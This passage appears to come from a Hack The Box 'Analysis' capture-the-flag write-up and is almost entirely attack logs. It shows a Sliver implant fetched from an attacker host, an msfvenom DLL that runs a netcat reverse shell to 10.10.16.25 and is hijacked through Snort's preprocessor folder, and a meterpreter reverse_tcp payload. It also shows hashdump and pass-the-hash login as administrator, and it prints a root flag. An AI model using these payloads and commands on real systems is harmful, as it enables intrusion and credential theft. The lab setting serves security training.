 ID         Name         Transport   Remote Address        Hostname      Username              Operating System   Locale   Last Message                            Health  
========== ============ =========== ===================== ============= ===================== ================== ======== ======================================= =========
 69f5096f   ROUGH_NEWS   http(s)     10.129.36.127:58073   DC-ANALYSIS   ANALYSIS\webservice   windows/amd64      fr-FR    Sat Jan 20 23:10:59 UTC 2024 (1s ago)   [ALIVE] 

[server] sliver > use 69f5096f-5cc5-497f-bb82-988510543752

[*] Active session ROUGH_NEWS (69f5096f-5cc5-497f-bb82-988510543752)

[server] sliver (ROUGH_NEWS) >
```

```c
*Evil-WinRM* PS C:\Users\jdoe\Downloads> iwr http://10.10.16.25:8888/ROUGH_NEWS.exe -o ROUGH_NEWS.exe
*Evil-WinRM* PS C:\Users\jdoe\Downloads> .\ROUGH_NEWS.exe
```

```c
[server] sliver (ROUGH_NEWS) > ls

C:\Users\jdoe\appdata\local\Automation (1 item, 68 B)
=====================================================
-rw-rw-rw-  run.bat  68 B  Sat Nov 18 09:57:09 +0100 2023
```

```c
[server] sliver (ROUGH_NEWS) > cat run.bat

start "BCEncoder" "C:\Program Files\BCTextEncoder\BCTextEncoder.exe"
```

```c
[server] sliver (ROUGH_NEWS) > ls

C:\private (1 item, 576 B)
==========================
-rw-rw-rw-  encoded.txt  576 B  Fri May 26 08:44:45 +0100 2023
```

```c
[server] sliver (ROUGH_NEWS) > cat encoded.txt

��-----BEGIN ENCODED MESSAGE-----
Version: BCTextEncoder Utility v. 1.03.2.1

wy4ECQMCq0jPQTxt+3BgTzQTBPQFbt5KnV7LgBq6vcKWtbdKAf59hbw0KGN9lBIK
0kcBSYXfHU2s7xsWA3pCtjthI0lge3SyLOMw9T81CPqT3HOIKkh3SVcO9jdrxfwu
pHnjX+5HyybuBwIQwGprgyWdGnyv3mfcQQ==
=a7bc
-----END ENCODED MESSAGE-----
```

## Unintended Way

> https://www.h4k-it.com/installing-and-configuring-snort/

```c
*Evil-WinRM* PS C:\temp> iwr http://10.10.16.25:8888/nc64.exe -o nc64.exe
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/analysis/serve]
└─$ msfvenom -p windows/x64/exec CMD='C:\temp\nc64.exe 10.10.16.25 443 -e cmd.exe' -f dll > sf_egnine.dll 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 311 bytes
Final size of dll file: 9216 bytes
```

```c
*Evil-WinRM* PS C:\temp> iwr http://10.10.16.25:8888/sf_egnine.dll -o sf_egnine.dll
```

```c
PS C:\Snort\lib\snort_dynamicpreprocessor> ls
ls


    Répertoire : C:\Snort\lib\snort_dynamicpreprocessor


Mode                LastWriteTime         Length Name                                              
----                -------------         ------ ----                                              
-a----       24/05/2022     06:46         207872 sf_dce2.dll                                       
-a----       24/05/2022     06:46          33792 sf_dnp3.dll                                       
-a----       24/05/2022     06:46          22528 sf_dns.dll                                        
-a----       24/05/2022     06:46         108032 sf_ftptelnet.dll                                  
-a----       24/05/2022     06:46          47616 sf_gtp.dll                                        
-a----       24/05/2022     06:47          59392 sf_imap.dll                                       
-a----       24/05/2022     06:47          23552 sf_modbus.dll                                     
-a----       24/05/2022     06:47          58368 sf_pop.dll                                        
-a----       24/05/2022     06:47          52736 sf_reputation.dll                                 
-a----       24/05/2022     06:47          37888 sf_sdf.dll                                        
-a----       24/05/2022     06:47          52224 sf_sip.dll                                        
-a----       24/05/2022     06:47          78848 sf_smtp.dll                                       
-a----       24/05/2022     06:47          22016 sf_ssh.dll                                        
-a----       24/05/2022     06:47          32256 sf_ssl.dll
```

```c
PS C:\Snort\lib\snort_dynamicpreprocessor> copy C:\temp\sf_engine.dll
copy C:\temp\sf_engine.dll
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.25] from (UNKNOWN) [10.129.36.127] 63801
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name               SID                                         
======================= ============================================
analysis\administrateur S-1-5-21-916175351-3772503854-3498620144-500


GROUP INFORMATION
-----------------

Group Name                                                          Type             SID                                          Attributes                                                     
=================================================================== ================ ============================================ ===============================================================
Tout le monde                                                       Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrateurs                                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Utilisateurs                                                Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group             
BUILTIN\Acc�s compatible pr�-Windows 2000                           Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group             
AUTORITE NT\SERVICE                                                 Well-known group S-1-5-6                                      Mandatory group, Enabled by default, Enabled group             
OUVERTURE DE SESSION DE CONSOLE                                     Well-known group S-1-2-1                                      Mandatory group, Enabled by default, Enabled group             
AUTORITE NT\Utilisateurs authentifi�s                               Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group             
AUTORITE NT\Cette organisation                                      Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group             
LOCAL                                                               Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group             
ANALYSIS\Propri�taires cr�ateurs de la strat�gie de groupe          Group            S-1-5-21-916175351-3772503854-3498620144-520 Mandatory group, Enabled by default, Enabled group             
ANALYSIS\Admins du domaine                                          Group            S-1-5-21-916175351-3772503854-3498620144-512 Mandatory group, Enabled by default, Enabled group             
ANALYSIS\Administrateurs de l'entreprise                            Group            S-1-5-21-916175351-3772503854-3498620144-519 Mandatory group, Enabled by default, Enabled group             
ANALYSIS\Administrateurs du sch�ma                                  Group            S-1-5-21-916175351-3772503854-3498620144-518 Mandatory group, Enabled by default, Enabled group             
Identit� d�clar�e par une autorit� d'authentification               Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group             
ANALYSIS\Groupe de r�plication dont le mot de passe RODC est refus� Alias            S-1-5-21-916175351-3772503854-3498620144-572 Mandatory group, Enabled by default, Enabled group, Local Group
�tiquette obligatoire\Niveau obligatoire �lev�                      Label            S-1-16-12288                                                                                                


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

## user.txt

```c
C:\Users\Administrateur\Desktop>type root.txt
type root.txt
5e9f2a52c2a5289fb3fa87cf98966f77
```

## Post PWN Cleanup

```c
┌──(user㉿kali)-[/media/…/htb/machines/analysis/serve]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=6969 -f exe -o a.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: a.exe
```

```c
┌──(user㉿kali)-[~]
└─$ msfconsole 
Metasploit tip: After running db_nmap, be sure to check out the result 
of hosts and services
                                                  

  Metasploit Park, System Security Interface
  Version 4.0.5, Alpha E
  Ready...
  > access security
  access: PERMISSION DENIED.
  > access security grid
  access: PERMISSION DENIED.
  > access main security grid
  access: PERMISSION DENIED....and...
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!


       =[ metasploit v6.3.50-dev                          ]
+ -- --=[ 2384 exploits - 1235 auxiliary - 417 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 6969
LPORT => 6969
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.25:6969 
[*] Sending stage (200774 bytes) to 10.129.36.127

[*] Meterpreter session 3 opened (10.10.16.25:6969 -> 10.129.36.127:61576) at 2024-01-21 00:16:09 +0000

meterpreter >
```

```c
meterpreter > hashdump
```

```c
┌──(user㉿kali)-[~]
└─$ evil-winrm -i 10.129.36.127 -u administrateur -H 58<--- SNIP --->1d
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrateur\Documents>
```
